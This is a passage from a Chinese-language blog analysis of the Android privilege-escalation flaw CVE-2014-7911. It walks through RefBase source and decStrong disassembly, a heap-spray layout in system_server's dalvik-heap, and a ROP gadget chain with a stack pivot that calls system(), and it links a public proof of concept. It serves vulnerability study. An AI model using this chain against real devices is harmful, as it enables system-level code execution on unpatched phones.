class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> RefBase</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">            <span class="function"><span class="keyword">void</span>            <span class="title">incStrong</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span> <span class="keyword">const</span></span>;</span><br><span class="line">            <span class="function"><span class="keyword">void</span>            <span class="title">decStrong</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">void</span>            <span class="title">forceIncStrong</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//! DEBUGGING ONLY: Get current strong ref count.</span></span><br><span class="line">            <span class="keyword">int32_t</span>         getStrongCount() <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> weakref_type</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">RefBase*            <span class="title">refBase</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">void</span>                <span class="title">incWeak</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span>                <span class="title">decWeak</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// acquires a strong reference if there is already one.</span></span><br><span class="line">        <span class="function"><span class="keyword">bool</span>                <span class="title">attemptIncStrong</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// acquires a weak reference if there is already one.</span></span><br><span class="line">        <span class="comment">// This is not always safe. see ProcessState.cpp and BpBinder.cpp</span></span><br><span class="line">        <span class="comment">// for proper use.</span></span><br><span class="line">        <span class="function"><span class="keyword">bool</span>                <span class="title">attemptIncWeak</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//! DEBUGGING ONLY: Get current weak ref count.</span></span><br><span class="line">        <span class="keyword">int32_t</span>             getWeakCount() <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//! DEBUGGING ONLY: Print references held on object.</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span>                <span class="title">printRefs</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//! DEBUGGING ONLY: Enable tracking for this object.</span></span><br><span class="line">        <span class="comment">// enable -- enable/disable tracking</span></span><br><span class="line">        <span class="comment">// retain -- when tracking is enable, if true, then we save a stack trace</span></span><br><span class="line">        <span class="comment">//           for each reference and dereference; when retain == false, we</span></span><br><span class="line">        <span class="comment">//           match up references and dereferences and keep only the</span></span><br><span class="line">        <span class="comment">//           outstanding ones.</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">void</span>                <span class="title">trackMe</span><span class="params">(<span class="keyword">bool</span> enable, <span class="keyword">bool</span> retain)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="function">weakref_type*   <span class="title">createWeak</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="function">weakref_type*   <span class="title">getWeakRefs</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//! DEBUGGING ONLY: Print references held on object.</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span>  <span class="keyword">void</span>            <span class="title">printRefs</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; getWeakRefs()-&gt;printRefs(); &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//! DEBUGGING ONLY: Enable tracking of object.</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span>  <span class="keyword">void</span>            <span class="title">trackMe</span><span class="params">(<span class="keyword">bool</span> enable, <span class="keyword">bool</span> retain)</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        getWeakRefs()-&gt;trackMe(enable, retain);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> RefBase basetype;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">                            RefBase();</span><br><span class="line">    <span class="keyword">virtual</span>                 ~RefBase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Flags for extendObjectLifetime()</span></span><br><span class="line">    <span class="keyword">enum</span> &#123;</span><br><span class="line">        OBJECT_LIFETIME_STRONG  = <span class="number">0x0000</span>,</span><br><span class="line">        OBJECT_LIFETIME_WEAK    = <span class="number">0x0001</span>,</span><br><span class="line">        OBJECT_LIFETIME_MASK    = <span class="number">0x0001</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">void</span>            <span class="title">extendObjectLifetime</span><span class="params">(<span class="keyword">int32_t</span> mode)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Flags for onIncStrongAttempted()</span></span><br><span class="line">    <span class="keyword">enum</span> &#123;</span><br><span class="line">        FIRST_INC_STRONG = <span class="number">0x0001</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span>            <span class="title">onFirstRef</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span>            <span class="title">onLastStrongRef</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span>            <span class="title">onIncStrongAttempted</span><span class="params">(<span class="keyword">uint32_t</span> flags, <span class="keyword">const</span> <span class="keyword">void</span>* id)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span>            <span class="title">onLastWeakRef</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> weakref_type;</span><br><span class="line">    <span class="keyword">class</span> weakref_impl;</span><br><span class="line"></span><br><span class="line">                            RefBase(<span class="keyword">const</span> RefBase&amp; o);</span><br><span class="line">            RefBase&amp;        <span class="keyword">operator</span>=(<span class="keyword">const</span> RefBase&amp; o);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> ReferenceMover;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">renameRefs</span><span class="params">(<span class="keyword">size_t</span> n, <span class="keyword">const</span> ReferenceRenamer&amp; renamer)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">renameRefId</span><span class="params">(weakref_type* ref,</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">void</span>* old_id, <span class="keyword">const</span> <span class="keyword">void</span>* new_id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">renameRefId</span><span class="params">(RefBase* ref,</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">void</span>* old_id, <span class="keyword">const</span> <span class="keyword">void</span>* new_id)</span></span>;</span><br><span class="line"></span><br><span class="line">        weakref_impl* <span class="keyword">const</span> mRefs;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>而这里mRefBase是DeathRecipientList对象的父类，我们知道在C++中，对象的内存布局是先放置父类，然后放置自己的成员。而一个对象中方法是不占空间的，如果有虚函数会有一个虚函数表的地址(4字节)放置在对象的最开始，然后放置各个成员变量。这个类是有虚函数的，所以这里的mRefs变量的地址是DeathRecipientList对象也就是我们设置的mOrgue指针指向地址+4。</p>
<blockquote>
<blockquote>
<p>更多关于C++对象内存分布的资料可以在网上查阅</p>
</blockquote>
</blockquote>
<p>refs是一个weakref_impl类型的变量。weakref_impl是RefBase用来维护引用技术的类。它的定义如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> RefBase::weakref_impl : <span class="keyword">public</span> RefBase::weakref_type</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int32_t</span>    mStrong;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int32_t</span>    mWeak;</span><br><span class="line">    RefBase* <span class="keyword">const</span>      mBase;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int32_t</span>    mFlags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !DEBUG_REFS</span></span><br><span class="line"></span><br><span class="line">    weakref_impl(RefBase* base)</span><br><span class="line">        : mStrong(INITIAL_STRONG_VALUE)</span><br><span class="line">        , mWeak(<span class="number">0</span>)</span><br><span class="line">        , mBase(base)</span><br><span class="line">        , mFlags(<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addStrongRef</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*id*/</span>)</span> </span>&#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">removeStrongRef</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*id*/</span>)</span> </span>&#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">renameStrongRefId</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*old_id*/</span>, <span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*new_id*/</span>)</span> </span>&#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addWeakRef</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*id*/</span>)</span> </span>&#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">removeWeakRef</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*id*/</span>)</span> </span>&#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">renameWeakRefId</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*old_id*/</span>, <span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*new_id*/</span>)</span> </span>&#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printRefs</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">trackMe</span><span class="params">(<span class="keyword">bool</span>, <span class="keyword">bool</span>)</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    weakref_impl(RefBase* base)</span><br><span class="line">        : mStrong(INITIAL_STRONG_VALUE)</span><br><span class="line">        , mWeak(<span class="number">0</span>)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p>
<p>在decStrong函数中最后调用到了refs-&gt;mBase-&gt;onLastStrongRef(id)函数。从前面可以看到，这里的ref-&gt;mBase我们是可控的，所以通过构造特殊的内存布局我们就可以执行任意代码。</p>
<h4 id="汇编代码分析"><a href="#汇编代码分析" class="headerlink" title="汇编代码分析"></a>汇编代码分析</h4><p>为了更方便理解漏洞成因，这里再分析一下decStrong函数对应的汇编代码。使用IDA导入libutils.so，然后找到Android::RefBase::decStrong函数。这里我们已经可以控制的是r0寄存器(this指针)。</p>
<p><img src="1.PNG" alt=""></p>
<p>首先是对r0的使用：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">refs-&gt;removeStrongRef(id);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br></pre></td></tr></table></figure></p>
<p>对应的汇编代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldr r4, [r0, #4]   # r0为this指针，r4为mRefs</span><br><span class="line">mov r6, r1</span><br><span class="line">mov r0, r4         #r4指向mStrong，r0指向mStrong</span><br><span class="line">blx &lt;android_atomic_dec ()&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里的r4就是mRefs的地址，前面我们已经分析过了。然后调用了android_atomic_dec函数，传入的参数是&amp;refs-&gt;mStrong。refs是一个weakref_impl类，weakref_impl类没有虚函数，mStrong是它的第一个成员变量，所以mStrong的地址就是refs的地址。另外，refs-&gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。如下所示：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">removeStrongRef</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*id*/</span>)</span> </span>&#123; &#125;</span><br></pre></td></tr></table></figure></p>
<p>调用完android_atomic_dec后，继续执行下面的代码。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">	refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对应的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmp r0, #1          # r0 = refs-&gt;mStrong</span><br><span class="line">bne.n d1ea</span><br><span class="line">ldr r0, [r4, #8]    # r4 = &amp;refs-&gt;mStrong</span><br><span class="line">mov r1, r6</span><br><span class="line">ldr r3, [r0, #0] </span><br><span class="line">ldr r2, [r3, #12]</span><br><span class="line">blx r2</span><br></pre></td></tr></table></figure></p>
<p>注意，android_atomic_dec函数执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。为了调用refs-&gt;mBase-&gt;onLastStrongRef(id)(即：blx r2)，攻击者需要使refs-&gt;mStrong为1。<br>至此，可以看出攻击者为了实现代码执行，需要满足如下约束条件：</p>
<ul>
<li>drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域;</li>
<li>refs-&gt;mStrong必须为1;</li>
<li>refs-&gt;mBase-&gt;onLastStrongRef(id)需要执行成功。并最终指向可执行的内存区域。即满足：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">	refs = *(mOrgue+<span class="number">4</span>);</span><br><span class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">12</span>);</span><br><span class="line">	blx r2 ; &lt;—— controlled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>除此以外，攻击者还必须克服Android中的漏洞缓解技术——ASLR和DEP。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这里结合retme7公开的Poc分析如何利用这个漏洞。</p>
<h4 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h4><p>虽然Android上有地址空间随机化(ASLR)，但是因为所有app都是fork自zygote进程，所以基础模块和dalvik-heap的内存布局全都是相同的。可以分析自己的内存布局获得system-server的内存布局，然后使用基础模块构建ROP链就可以绕过ASLR。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell@hammerhead:/ # cat /proc/10156/maps | grep dalvik-heap</span><br><span class="line">4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)</span><br><span class="line">shell@hammerhead:/ # cat /proc/18446/maps | grep dalvik-heap</span><br><span class="line">4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)</span><br></pre></td></tr></table></figure></p>
<h4 id="Dalvik-heap-spary"><a href="#Dalvik-heap-spary" class="headerlink" title="Dalvik-heap spary"></a>Dalvik-heap spary</h4><p>为了能让blx r2这条执行能够可靠稳定的跳转到攻击者可控的代码，需要利用堆喷射技术，在system_server内存空间的dalvik-heap中预先布置大量的Spray Buffer, 其中放置提权代码以及大量指向该提权代码的地址。这涉及到两个问题。</p>
<ul>
<li>如何向sysetem_server的dalvik-heap空间传入可控字符串？</li>
<li>如何在dalvik-heap中布局这些可控字符串，才能在每次漏洞利用时都稳定执行代码？<br>对于第一个问题，我们知道system_server向android系统提供绝大多数的系统服务，通过这些服务的一些特定方法可以向system_server传入String，同时system_server把这些String存储在Dalvik-heap中，在GC之前都不会销毁。例如，下面android.content.Context中的registerReceiver方法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Intent <span class="title">registerReceiver</span> <span class="params">(BroadcastReceiver receiver, IntentFilter filter, String broadcastPermission, Handler scheduler)</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>其中broadcastPermission为String类型，调用该方法后，String Buffer将常驻system_server进程空间。具体调用链见<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ContextWrapper.registerReceiver-&gt;ContextImpl.registerReceiver-&gt;ContextImpl.registerReceiverInternal-&gt;ActivityManagerProxy.registerReceiver-&gt;ActivityManagerService.registerReceiver</span><br></pre></td></tr></table></figure></p>
<p>该调用链表明可从某个app的Context通过binder IPC跨进程调用system_server的ActivityManagerService.registerReceiver方法，注意ActivityManagerService常驻system_server进程空间。我们再看看ActivityManagerService的registerReceiver方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Intent <span class="title">registerReceiver</span><span class="params">(IApplicationThread caller, String callerPackage, IIntentReceiver receiver, IntentFilter filter, String permission, <span class="keyword">int</span> userId)</span> </span>&#123;</span><br><span class="line">enforceNotIsolatedCaller(<span class="string">"registerReceiver"</span>);</span><br><span class="line">    <span class="keyword">int</span> callingUid;</span><br><span class="line">    <span class="keyword">int</span> callingPid;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">        ......</span><br><span class="line">        ReceiverList rl</span><br><span class="line">            = (ReceiverList)mRegisteredReceivers.get(receiver.asBinder());</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        BroadcastFilter bf = <span class="keyword">new</span> BroadcastFilter(filter, rl, callerPackage,</span><br><span class="line">            permission, callingUid, userId); <span class="comment">//在Dalvik-heap中分配内存</span></span><br><span class="line">        rl.add(bf);</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">return</span> sticky;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意上面的new将在system_server进程的Dalvik-heap堆中分配内存，传入的String Buffer即permission将常驻system_server进程空间。这样，通过调用某些系统Api，第一个传入字符串的问题就解决了。<br>下面探讨第二个问题：如何在dalvik-heap中布局这些可控字符串，才能在每次漏洞利用时都能稳定执行代码？</p>
<p>根据前面的叙述，攻击者可控的mOrgue需要指向一个可读的内存区域，简单地让其指向传入registerReceiver方法permission参数String Buffer所属的地址区域并在String Buffer中布置ROP Gadget即可达到这个目的，但system_server在其dalvik-heap中分配String Buffer的偏移地址却是未知的，mOrgue未必能命中（指向）堆块中为String Buffer分配的内存。为了提高命中率，需要在dalvik-heap中分配大量的String Buffer，这就是Heap Spray(堆喷射)技术，反复调用registerReceiver方法分配大量的String Buffer即可完成Heap Spray。但是，String Buffer的地址在每次调用registerReceiver方法分配内存时都会不一样，这就需要构造一种特殊的堆喷射布局，包含递减的指针值，如图。</p>
<p><img src="2015110404465729794CVE-2014-7911.png" alt=""></p>
<p>如图，每一个在堆中分配的内存块(chunk)，都包含Relative Address Chunk和Gadget_buffer两部分，目标是使可控的STATIC_ADDRESS（即mOrgue）位于Relative Address Chunk，并且使其存放的内容[STATIC_ADDRESS]=GADGET_BUFFER（即Gadget_buffer的地址）。简单的思路就是在每个chunk的relative Address Chunk中都放入GADGET_BUFFER，然而由于GADGET_BUFFER在每个chunk中都不一样，而且也无法在跨进程传入system_server之前提前知晓，因此该思路并不可行。</p>
<p>注意，GADGET_BUFFER = 堆底地址 + Gadget_buffer_offset(即Gadget_Buffer相对于堆底的偏移)。当STATIC_ADDRESS=堆底地址时，GADGET_BUFFER = STATIC_ADRRESS+Gadget_buffer_offset；考虑到四字节对齐，一般情况下，STATIC_ADDRESS=堆底地址+4N（N=1,2,…），此时GADGET_BUFFER = STATIC_ADDRESS + Gadget_buffer_offset - 4N。因此，在每一个Chunk的Relative Address Chunk区域按地址增长方向，依次在内存中填入STATIC_ADDRESS+Gadget_buffer_offset、STATIC_ADDRESS+Gadget_buffer_offset-4、…、STATIC_ADDRESS+Gadget_buffer_offset-4N。这样，给定一个STATIC_ADDRESS，只要能落入system_server在dalvik heap分配的Relative Addresses Chunk的地址范围(为了提高这个可能性，需要满足1.每一个Chunk的Relative Address Chunk比Gadget Buffer大很多；2.分配大量这样的Chunk），就总是存在[STATIC_ADDRESS]=GADGET_BUFFER，并满足[STATIC_ADDRESS+4N]=GADGET_BUFFER-4N（这个条件将在后面布置Gadget时用到）。</p>
<p>按照这样的布局，回过来再看汇编代码，布置Gadget_Buffer。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldr     r4, [r0, #4]   # r0=STATIC_ADDRESS--&gt;r4=[STATIC_ADDRESS+4]=GADGET_BUFFER-4</span><br><span class="line">mov     r6, r1</span><br><span class="line">mov     r0, r4  # r0=GADGET_BUFFER-4</span><br><span class="line">blx     &lt;android_atomic_dec ()&gt;</span><br></pre></td></tr></table></figure></p>
<p>调用android_atomic_dec函数之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmp     r0, #1          # r0 = [GADGET_BUFFER-4]</span><br><span class="line">bne.n   d1ea</span><br><span class="line">ldr     r0, [r4, #8]    # r0 = [GADGET_BUFFER-4+8] = [GADGET_BUFFER+4]</span><br><span class="line">mov     r1, r6</span><br><span class="line">ldr     r3, [r0, #0]    # r3 =[[GADGET_BUFFER+4]] = [STATIC_ADDRESS+12] = GADGET_BUFFER-12</span><br><span class="line">ldr     r2, [r3, #12]   # r2 = [GADGET_BUFFER -12 +12] = [GADGET_BUFFER]</span><br><span class="line">blx     r2</span><br></pre></td></tr></table></figure></p>
<p>首先，为了进入blx r2这条分支，r0必须等于1，也就是[GADGET_BUFFER-4]=1；其次，[GADGET_BUFFER+4]必须为一个合法可读的地址，为了方便之后的布局，我们令[GADGET_BUFFER+4]=STATIC_ADDRESS+12，因此r3 = [STATIC_ADDRESS+12]=GADGET_BUFFER-12,接下来r2=[r3+12]=[GADGET_BUFFER-12+12]=[GADGET_BUFFER]，程序将跳转到GADGET_BUFFER这个地址存放的内容执行，因此在这里就可以布置ROP Gadget1的地址了。至此，通过一种特殊布局的堆喷射，第二个代码稳定执行的问题也迎刃而解。</p>
<h4 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h4><p>由于Android使用了DEP，因此Dalvik-heap上的内存不能用来执行，这就必须使用ROP技术，使PC跳转到一系列合法指令序列（Gadget），并由这些Gadget“拼凑”而成shellcode。这里我们将使用ROP Gadget调用system函数执行代码。</p>
<p>使用ROPGadget这个工具，在zygote加载的基础模块（如libc.so、libwebviewchromium.so、libdvm.so）上进行搜索，把arm code当做thumb code来搜索，可以增加更多的候选指令序列。</p>
<p>为了调用system函数，需要控制r0寄存器，指向我们预先布置的命令行字符串作为参数。这里需要使用Stack Pivot技术，将栈顶指针SP指向控制的Dalvik-heap堆中的数据，这将为控制PC寄存器、以及在栈上布置数据带来便利。利用<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --thumb --binary libwebviewchromium.so</span><br></pre></td></tr></table></figure></p>
<p>可找到如下Gadget</p>
<h5 id="Gadget1"><a href="#Gadget1" class="headerlink" title="Gadget1"></a>Gadget1</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r5=STATIC_ADDRESS</span><br><span class="line">ldr r7, [r5]</span><br><span class="line">r7=GADGET_CHUNK_ADDR</span><br><span class="line">mov r0, r5</span><br><span class="line">r0=STATIC_ADDRESS</span><br><span class="line">ldr r1, [r7, <span class="comment">#8]</span></span><br><span class="line">r1=[GADGET_CHUNK_ADDR + 8]</span><br><span class="line">blx r1</span><br></pre></td></tr></table></figure>
<p>通过r1跳转到第二个gadget：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">r7=GADGET_CHUNK_ADDR</span><br><span class="line">add.w r7, r7, <span class="comment">#8</span></span><br><span class="line">r7=GADGET_CHUNK_ADDR + 8</span><br><span class="line">mov sp, r7</span><br><span class="line">sp = GADGET_CHUNK_ADDR + 8</span><br><span class="line">pop &#123;r4, r5, r7, pc&#125;</span><br><span class="line">r4=[GADGET_CHUNK_ADDR + 8]</span><br><span class="line">r5=[GADGET_CHUNK_ADDR + 12]=system_addr</span><br><span class="line">r7=[GADGET_CHUNK_ADDR + 16]</span><br><span class="line">pc=[GADGET_CHUNK_ADDR + 20]</span><br></pre></td></tr></table></figure></p>
<p>这里我提前将system函数的地址写入[GADGET_CHUNK_ADDR + 12]。<br>有一个问题，为什么要通过第一个gadget的过渡，才完成stack pivot？<br>答:事实上是不得已而为之，我用ROPgadget扫描了整个/system/lib目录下的基础模块的”mov sp, r”，只发现有mov sp, r7，所以只能采取这种过度的方式。<br>继续来到第三个gadget：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp=[GADGET_CHUNK_ADDR + 24]</span><br><span class="line">mov r0, sp</span><br><span class="line">r5=system_addr</span><br><span class="line">blx r5</span><br></pre></td></tr></table></figure></p>
<p>如此，我们将命令字符串放在GADGET_CHUNK_ADDR + 24开始的空间就可以了，最终完成了对CVE-2014-7911漏洞的system权限提权，并执行任意代码。最后附上retme的Poc：<br><a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="external">https://github.com/retme7/CVE-2014-7911_poc</a></p>

  </section>

  

